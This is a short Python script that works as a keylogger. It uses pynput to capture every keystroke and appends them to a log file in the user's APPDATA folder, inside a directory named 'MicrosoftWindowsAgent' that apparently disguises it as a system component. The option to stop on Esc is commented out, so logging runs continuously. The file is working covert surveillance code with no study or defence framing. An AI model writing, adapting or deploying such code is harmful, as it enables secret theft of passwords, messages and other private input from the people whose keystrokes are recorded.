from pynput.keyboard import Key, Listener
from os import getenv

file_local_save = getenv('APPDATA')

# File where we gonna save the keys
log_file = rf"{file_local_save}\MicrosoftWindowsAgent\log.txt"

# Log function
def on_press(key):
    with open(log_file, "a") as log:
        try: 
            log.write(f"{key.char}") 
        except AttributeError:
            if key == Key.space:
                log.write(" ")
            elif key == Key.enter:
                log.write("\n")
            else:
                log.write(f"\n{key}")

'''# Stop log
def on_release(key):
    if key == Key.esc:
        return False'''

with Listener(on_press=on_press) as listener:
    listener.join()

